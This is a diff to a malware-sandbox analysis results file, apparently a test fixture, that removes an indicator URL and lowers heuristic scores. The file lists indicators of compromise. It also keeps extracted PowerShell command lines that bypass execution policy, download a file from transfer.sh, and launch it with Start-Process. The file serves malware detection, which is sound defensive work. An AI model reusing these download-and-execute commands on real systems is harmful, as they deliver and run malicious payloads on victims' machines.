@@ -1,7 +1,7 @@
 {
   "extra": {
     "drop_file": false,
-    "score": 2572,
+    "score": 2072,
     "sections": [
       {
         "auto_collapse": true,
@@ -281,10 +281,6 @@
             "ioc_type": "domain"
           },
           {
-            "ioc": "http://deal.real",
-            "ioc_type": "uri"
-          },
-          {
             "ioc": "https://transfer.sh/get/vpiHmi/invoice.pdf",
             "ioc_type": "uri"
           },
@@ -316,13 +312,6 @@
         },
         "promote_to": null,
         "tags": {
-          "file": {
-            "string": {
-              "extracted": [
-                "http://deal.real"
-              ]
-            }
-          },
           "network": {
             "dynamic": {
               "domain": [
@@ -350,10 +339,6 @@
           {
             "ioc": "transfer.sh",
             "ioc_type": "domain"
-          },
-          {
-            "ioc": "http://deal.real",
-            "ioc_type": "uri"
           },
           {
             "ioc": "https://abc.xyz/img/bg-cropped.jpg",
@@ -391,13 +376,6 @@
         },
         "promote_to": null,
         "tags": {
-          "file": {
-            "string": {
-              "extracted": [
-                "http://deal.real"
-              ]
-            }
-          },
           "network": {
             "static": {
               "domain": [
@@ -426,10 +404,6 @@
             "ioc_type": "domain"
           },
           {
-            "ioc": "http://deal.real",
-            "ioc_type": "uri"
-          },
-          {
             "ioc": "https://transfer.sh/get/vpiHmi/invoice.pdf",
             "ioc_type": "uri"
           },
@@ -451,12 +425,12 @@
           "attack_ids": [],
           "frequency": 1,
           "heur_id": 13,
-          "score": 1000,
+          "score": 500,
           "score_map": {
             "wscript_pwsh_url": 500
           },
           "signatures": {
-            "wscript_pwsh_url": 2
+            "wscript_pwsh_url": 1
           }
         },
         "promote_to": null,
@@ -466,13 +440,6 @@
               "command_line": [
                 "powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFile('http://deal.real', 'C:\\Users\\Public\\apple.png')",
                 "powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFile('https://transfer.sh/get/vpiHmi/invoice.pdf', 'C:ProgramDatainvoice.pdf'); Start-Process 'C:ProgramDatainvoice.pdf'"
-              ]
-            }
-          },
-          "file": {
-            "string": {
-              "extracted": [
-                "http://deal.real"
               ]
             }
           },
@@ -658,27 +625,6 @@
             "wscript_pwsh_url"
           ],
           "value": "powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFile('https://transfer.sh/get/vpiHmi/invoice.pdf', 'C:ProgramDatainvoice.pdf'); Start-Process 'C:ProgramDatainvoice.pdf'"
-        }
-      ],
-      "file.string.extracted": [
-        {
-          "heur_id": 13,
-          "signatures": [
-            "suspicious_pwsh_url"
-          ],
-          "value": "http://deal.real"
-        },
-        {
-          "heur_id": 2,
-          "signatures": [],
-          "value": "http://deal.real"
-        },
-        {
-          "heur_id": 13,
-          "signatures": [
-            "wscript_pwsh_url"
-          ],
-          "value": "http://deal.real"
         }
       ],
       "network.dynamic.domain": [
